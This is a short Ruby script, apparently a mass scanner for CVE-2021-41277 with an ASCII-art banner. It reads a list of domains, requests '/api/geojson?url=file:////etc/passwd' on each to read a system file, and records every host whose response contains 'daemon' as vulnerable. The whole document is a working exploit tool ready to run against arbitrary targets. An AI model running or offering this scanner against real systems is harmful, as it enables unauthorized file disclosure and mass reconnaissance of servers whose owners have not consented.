require 'httparty'
require 'colorize'
require 'timeout'

puts '            ───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
            ───█▒▒░░░░░░░░░▒▒█───
            ────█░░█░░░░░█░░█────
            ─▄▄──█░░░▀█▀░░░█──▄▄─
            █░░█─▀▄░░░░░░░▄▀─█░░█
            █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
            █░░                ░░█
            █░░ ℂ𝕍𝔼 𝟚𝟘𝟚𝟙-𝟜𝟙𝟚𝟟𝟟 ░░█
            █░░   Little_Boy   ░░█
            █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█'.green
puts
puts
print 'Enter your domain list : '
domain = gets.chomp
print 'Enter your file name save : '
file_name = gets.chomp

file = File.open(domain, "r").read
data = file.split("\n")

data.each do |domen|
begin
    status = Timeout::timeout(2){
    response = HTTParty.get(domen+'/api/geojson?url=file:////etc/passwd')
    puts

if response.body.include?('daemon' || '/nologin')
    puts '[+] => Vulnerable'.colorize(:yellow)
    File.open("#{file_name}","a+"){|file|file.write("#{domen}\n")}
    puts "File Saved => #{Dir.pwd}/#{file_name}".yellow
else !response.body.include?('daemon' || '/nologin')
    puts '[-] => Not Vulnerable'.colorize(:red)
end
}
rescue OpenSSL::SSL::SSLError
    puts
    puts "[-] => SSL Error...".red
rescue Errno::ECONNREFUSED
    puts "[-] => Connection Refused!" 
rescue Timeout::Error
    puts
    puts "[-] => Time Out...".red
rescue Errno::ECONNRESET
rescue Interrupt
    puts "Leaving the program...".red
end
end
